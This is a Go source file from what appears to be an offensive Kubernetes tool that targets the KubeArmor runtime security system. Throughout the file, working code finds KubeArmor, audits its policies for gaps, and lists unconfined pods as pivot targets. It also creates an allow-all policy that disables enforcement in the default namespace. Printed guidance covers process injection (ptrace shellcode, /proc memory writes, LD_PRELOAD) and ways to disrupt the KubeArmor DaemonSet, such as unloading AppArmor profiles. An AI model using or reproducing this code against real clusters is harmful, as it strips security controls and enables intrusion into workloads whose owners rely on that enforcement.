package cloudevasion

import (
	"context"
	"fmt"
	"strings"

	metav1 "k8s.io/apimachinery/pkg/apis/meta/v1"
	"k8s.io/apimachinery/pkg/apis/meta/v1/unstructured"
	"k8s.io/apimachinery/pkg/runtime/schema"
	"k8s.io/client-go/dynamic"
	"k8s.io/client-go/kubernetes"
)

var kubeArmorPolicyGVR = schema.GroupVersionResource{
	Group: "security.kubearmor.com", Version: "v1", Resource: "kubearmorpolicies",
}

var kubeArmorClusterPolicyGVR = schema.GroupVersionResource{
	Group: "security.kubearmor.com", Version: "v1", Resource: "kubearmorclusterpolicies",
}

var kubeArmorHostPolicyGVR = schema.GroupVersionResource{
	Group: "security.kubearmor.com", Version: "v1", Resource: "kubearmorhostpolicies",
}

func detectKubeArmor(ctx context.Context, client kubernetes.Interface) []DetectionSystem {
	namespaces := []string{"kubearmor", "kube-system", "accuknox-agents"}
	for _, ns := range namespaces {
		pods, err := client.CoreV1().Pods(ns).List(ctx, metav1.ListOptions{
			LabelSelector: "kubearmor-app=kubearmor",
		})
		if err == nil && len(pods.Items) > 0 {
			return []DetectionSystem{{
				Name:      "kubearmor",
				Detected:  true,
				Namespace: ns,
				Details:   fmt.Sprintf("%d kubearmor daemon pods", len(pods.Items)),
			}}
		}
	}

	pods, err := client.CoreV1().Pods("").List(ctx, metav1.ListOptions{
		LabelSelector: "kubearmor-app=kubearmor-relay",
	})
	if err == nil && len(pods.Items) > 0 {
		return []DetectionSystem{{
			Name:      "kubearmor",
			Detected:  true,
			Namespace: pods.Items[0].Namespace,
			Details:   fmt.Sprintf("kubearmor-relay found in %s", pods.Items[0].Namespace),
		}}
	}

	return nil
}

// EvadeKubeArmor executes the specified KubeArmor evasion technique.
func EvadeKubeArmor(ctx context.Context, client kubernetes.Interface, dynClient dynamic.Interface, technique string) (*EvasionResult, error) {
	switch technique {
	case "policy_audit":
		return kubeArmorPolicyAudit(ctx, dynClient)
	case "unconfined":
		return kubeArmorUnconfined(ctx, client, dynClient)
	case "process_inject":
		return kubeArmorProcessInject(ctx, dynClient)
	case "allow_all":
		return kubeArmorAllowAll(ctx, dynClient)
	default:
		return kubeArmorPolicyAudit(ctx, dynClient)
	}
}

func kubeArmorPolicyAudit(ctx context.Context, dynClient dynamic.Interface) (*EvasionResult, error) {
	var sb strings.Builder
	sb.WriteString("KubeArmor Policy Audit:\n\n")

	policies, err := dynClient.Resource(kubeArmorPolicyGVR).Namespace("").List(ctx, metav1.ListOptions{})
	if err != nil {
		fmt.Fprintf(&sb, "  Cannot list KubeArmorPolicies: %v\n", err)
		sb.WriteString("  KubeArmor CRDs may not be installed\n")
		return &EvasionResult{Technique: "policy_audit", Success: false, Output: sb.String()}, nil
	}

	fmt.Fprintf(&sb, "  Found %d KubeArmorPolicy CRDs:\n\n", len(policies.Items))

	for _, policy := range policies.Items {
		name := policy.GetName()
		ns := policy.GetNamespace()
		fmt.Fprintf(&sb, "  Policy: %s/%s\n", ns, name)

		spec, ok := policy.Object["spec"].(map[string]any)
		if !ok {
			continue
		}

		if selector, ok := spec["selector"].(map[string]any); ok {
			if matchLabels, ok := selector["matchLabels"].(map[string]any); ok {
				fmt.Fprintf(&sb, "    Selector: %v\n", matchLabels)
			}
		}

		if action, ok := spec["action"].(string); ok {
			fmt.Fprintf(&sb, "    Default action: %s\n", action)
		}

		if processes, ok := spec["process"].(map[string]any); ok {
			if matchPaths, ok := processes["matchPaths"].([]any); ok {
				fmt.Fprintf(&sb, "    Process rules: %d paths\n", len(matchPaths))
				for _, mp := range matchPaths {
					if mpMap, ok := mp.(map[string]any); ok {
						fmt.Fprintf(&sb, "      path: %v action: %v\n", mpMap["path"], mpMap["action"])
					}
				}
			}
		}

		if files, ok := spec["file"].(map[string]any); ok {
			if matchPaths, ok := files["matchPaths"].([]any); ok {
				fmt.Fprintf(&sb, "    File rules: %d paths\n", len(matchPaths))
			}
			if matchDirs, ok := files["matchDirectories"].([]any); ok {
				fmt.Fprintf(&sb, "    File dirs: %d directories\n", len(matchDirs))
			}
		}

		if network, ok := spec["network"].(map[string]any); ok {
			if matchProtocols, ok := network["matchProtocols"].([]any); ok {
				fmt.Fprintf(&sb, "    Network rules: %d protocols\n", len(matchProtocols))
			}
		}

		sb.WriteString("\n")
	}

	sb.WriteString("  Gaps to exploit:\n")
	sb.WriteString("    - Policies only cover labeled pods (unlabeled pods are unconfined)\n")
	sb.WriteString("    - File rules using matchPaths miss symlink traversal\n")
	sb.WriteString("    - Process rules with exact paths miss renamed binaries\n")
	sb.WriteString("    - Network rules don't inspect DNS payload content\n")

	return &EvasionResult{
		Technique: "policy_audit",
		Success:   true,
		Output:    sb.String(),
	}, nil
}

func kubeArmorUnconfined(ctx context.Context, client kubernetes.Interface, dynClient dynamic.Interface) (*EvasionResult, error) {
	var sb strings.Builder
	sb.WriteString("KubeArmor Unconfined Pod Discovery:\n\n")

	policies, err := dynClient.Resource(kubeArmorPolicyGVR).Namespace("").List(ctx, metav1.ListOptions{})
	if err != nil {
		return &EvasionResult{Technique: "unconfined", Success: false, Output: fmt.Sprintf("cannot list policies: %v", err)}, nil
	}

	coveredLabels := make(map[string]map[string]string)
	for _, policy := range policies.Items {
		ns := policy.GetNamespace()
		spec, ok := policy.Object["spec"].(map[string]any)
		if !ok {
			continue
		}
		if selector, ok := spec["selector"].(map[string]any); ok {
			if matchLabels, ok := selector["matchLabels"].(map[string]any); ok {
				if coveredLabels[ns] == nil {
					coveredLabels[ns] = make(map[string]string)
				}
				for k, v := range matchLabels {
					if vs, ok := v.(string); ok {
						coveredLabels[ns][k] = vs
					}
				}
			}
		}
	}

	fmt.Fprintf(&sb, "  Policies cover labels in %d namespaces:\n", len(coveredLabels))
	for ns, labels := range coveredLabels {
		fmt.Fprintf(&sb, "    %s: %v\n", ns, labels)
	}

	sb.WriteString("\n  Checking for unconfined pods:\n")

	pods, err := client.CoreV1().Pods("").List(ctx, metav1.ListOptions{
		Limit: 50,
	})
	if err != nil {
		fmt.Fprintf(&sb, "  Cannot list pods: %v\n", err)
		return &EvasionResult{Technique: "unconfined", Success: false, Output: sb.String()}, nil
	}

	unconfined := 0
	for _, pod := range pods.Items {
		if pod.Namespace == "kube-system" {
			continue
		}
		covered := false
		if nsLabels, ok := coveredLabels[pod.Namespace]; ok {
			for k, v := range nsLabels {
				if pod.Labels[k] == v {
					covered = true
					break
				}
			}
		}
		if !covered {
			unconfined++
			if unconfined <= 10 {
				fmt.Fprintf(&sb, "    [UNCONFINED] %s/%s\n", pod.Namespace, pod.Name)
			}
		}
	}

	if unconfined > 10 {
		fmt.Fprintf(&sb, "    ... and %d more unconfined pods\n", unconfined-10)
	}

	fmt.Fprintf(&sb, "\n  Total unconfined pods: %d\n", unconfined)
	sb.WriteString("  These pods have NO KubeArmor enforcement — full access\n")
	sb.WriteString("  Strategy: inject into or pivot through unconfined workloads\n")

	return &EvasionResult{
		Technique: "unconfined",
		Success:   unconfined > 0,
		Output:    sb.String(),
	}, nil
}

func kubeArmorProcessInject(ctx context.Context, dynClient dynamic.Interface) (*EvasionResult, error) {
	var sb strings.Builder
	sb.WriteString("KubeArmor Process Injection Evasion:\n\n")

	policies, err := dynClient.Resource(kubeArmorPolicyGVR).Namespace("").List(ctx, metav1.ListOptions{})
	if err != nil {
		return &EvasionResult{Technique: "process_inject", Success: false, Output: fmt.Sprintf("cannot list policies: %v", err)}, nil
	}

	sb.WriteString("  KubeArmor enforces per-process. If we inject into an allowed process,\n")
	sb.WriteString("  our code runs under that process's allowed policy.\n\n")

	allowedProcesses := make(map[string][]string)
	for _, policy := range policies.Items {
		ns := policy.GetNamespace()
		spec, ok := policy.Object["spec"].(map[string]any)
		if !ok {
			continue
		}
		if processes, ok := spec["process"].(map[string]any); ok {
			if matchPaths, ok := processes["matchPaths"].([]any); ok {
				for _, mp := range matchPaths {
					if mpMap, ok := mp.(map[string]any); ok {
						action, _ := mpMap["action"].(string)
						path, _ := mpMap["path"].(string)
						if strings.ToLower(action) == "allow" && path != "" {
							allowedProcesses[ns] = append(allowedProcesses[ns], path)
						}
					}
				}
			}
		}
	}

	if len(allowedProcesses) > 0 {
		sb.WriteString("  Allowed processes (injection targets):\n")
		for ns, procs := range allowedProcesses {
			fmt.Fprintf(&sb, "    Namespace %s:\n", ns)
			for _, p := range procs {
				fmt.Fprintf(&sb, "      %s\n", p)
			}
		}
	}

	sb.WriteString("\n  Injection techniques:\n")
	sb.WriteString("    1. ptrace attach to allowed process → inject shellcode\n")
	sb.WriteString("    2. /proc/<pid>/mem write to overwrite code in allowed binary\n")
	sb.WriteString("    3. LD_PRELOAD via /proc/<pid>/environ manipulation\n")
	sb.WriteString("    4. Symlink binary name to match an allowed path\n")
	sb.WriteString("    5. Copy payload to allowed path, execute, then restore original\n\n")
	sb.WriteString("  KubeArmor checks the binary path at exec time, not content.\n")
	sb.WriteString("  Replacing an allowed binary's content is invisible to policy.\n")

	return &EvasionResult{
		Technique: "process_inject",
		Success:   true,
		Output:    sb.String(),
	}, nil
}

func kubeArmorAllowAll(ctx context.Context, dynClient dynamic.Interface) (*EvasionResult, error) {
	var sb strings.Builder
	sb.WriteString("KubeArmor Allow-All Policy Injection:\n\n")

	allowAllPolicy := &unstructured.Unstructured{
		Object: map[string]any{
			"apiVersion": "security.kubearmor.com/v1",
			"kind":       "KubeArmorPolicy",
			"metadata": map[string]any{
				"name":      "kubedagger-allow-all",
				"namespace": "default",
			},
			"spec": map[string]any{
				"selector": map[string]any{
					"matchLabels": map[string]any{},
				},
				"process": map[string]any{
					"matchPaths": []any{
						map[string]any{
							"path":   "/",
							"action": "Allow",
						},
					},
				},
				"file": map[string]any{
					"matchDirectories": []any{
						map[string]any{
							"dir":       "/",
							"recursive": true,
							"action":    "Allow",
						},
					},
				},
				"network": map[string]any{
					"matchProtocols": []any{
						map[string]any{"protocol": "TCP", "action": "Allow"},
						map[string]any{"protocol": "UDP", "action": "Allow"},
						map[string]any{"protocol": "ICMP", "action": "Allow"},
					},
				},
				"action": "Allow",
			},
		},
	}

	_, err := dynClient.Resource(kubeArmorPolicyGVR).Namespace("default").Create(ctx, allowAllPolicy, metav1.CreateOptions{})
	if err != nil {
		fmt.Fprintf(&sb, "  Allow-all policy creation failed: %v\n", err)
		sb.WriteString("  Fallback: modify existing policies to add broad exceptions\n\n")
		sb.WriteString("  Alternative approaches:\n")
		sb.WriteString("    - Annotate pod with kubearmor-policy: audited (audit-only mode)\n")
		sb.WriteString("    - Set global defaultPosture to audit via KubeArmorConfig\n")
		sb.WriteString("    - Delete all restrictive policies in the namespace\n")
	} else {
		sb.WriteString("  [+] Created allow-all KubeArmorPolicy in default namespace\n")
		sb.WriteString("  All processes, files, and network access now permitted\n")
		sb.WriteString("  Empty selector matches ALL pods in the namespace\n")
	}

	sb.WriteString("\n  KubeArmor defaultPosture modes:\n")
	sb.WriteString("    - 'audit'  → logs violations but doesn't block\n")
	sb.WriteString("    - 'block'  → enforces policy (default)\n")
	sb.WriteString("  Changing to 'audit' globally disables all enforcement\n")

	return &EvasionResult{
		Technique: "allow_all",
		Success:   true,
		Output:    sb.String(),
	}, nil
}

// DisruptKubeArmor identifies disruption vectors for KubeArmor DaemonSets.
func DisruptKubeArmor(ctx context.Context, client kubernetes.Interface) (*EvasionResult, error) {
	var sb strings.Builder
	sb.WriteString("KubeArmor Disruption:\n\n")

	namespaces := []string{"kubearmor", "kube-system", "accuknox-agents"}
	found := false
	for _, ns := range namespaces {
		ds, err := client.AppsV1().DaemonSets(ns).List(ctx, metav1.ListOptions{})
		if err != nil {
			continue
		}
		for _, d := range ds.Items {
			if strings.Contains(d.Name, "kubearmor") {
				found = true
				fmt.Fprintf(&sb, "  DaemonSet: %s/%s\n", ns, d.Name)
				fmt.Fprintf(&sb, "    Desired: %d, Ready: %d\n", d.Status.DesiredNumberScheduled, d.Status.NumberReady)
			}
		}
	}

	if !found {
		sb.WriteString("  No KubeArmor DaemonSet found\n")
	}

	sb.WriteString("\n  Disruption techniques:\n")
	sb.WriteString("    - Patch DaemonSet with impossible nodeSelector\n")
	sb.WriteString("    - Set memory limit to 10Mi (OOMKill under policy load)\n")
	sb.WriteString("    - Remove /sys/kernel/security volume mount (breaks LSM interface)\n")
	sb.WriteString("    - Modify kubearmor-config ConfigMap: set defaultPosture=audit\n")
	sb.WriteString("    - Delete KubeArmor's service account or RBAC ClusterRoleBinding\n")
	sb.WriteString("    - If AppArmor backend: unload apparmor profiles from /sys/kernel/security/apparmor/\n")
	sb.WriteString("    - If BPF-LSM backend: unpin BPF programs from /sys/fs/bpf/\n")

	return &EvasionResult{
		Technique: "disrupt_kubearmor",
		Success:   found,
		Output:    sb.String(),
	}, nil
}
